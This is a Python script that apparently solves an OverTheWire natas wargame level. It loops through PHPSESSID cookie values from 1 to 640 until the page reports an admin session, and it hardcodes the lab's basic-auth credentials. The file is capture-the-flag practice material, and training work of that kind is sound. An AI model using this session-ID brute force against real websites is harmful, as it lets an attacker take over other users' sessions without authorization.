#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
from time import time, sleep

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

username = 'natas198'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#seen_password = ''

for session_id in range(1,641):
    response = session.get(url, cookies = {"PHPSESSID" : str(session_id)}, auth = (username, password))
    #response = session.post(url, data = {"username": "natas19", "password" : "mario"}, auth = (username, password))
    content = response.text
    if "You are an admin" in content :
        print("Got it!", session_id)
        print(content)
        break
    else:
        print("Trying : ", session_id)

#print(session.cookies)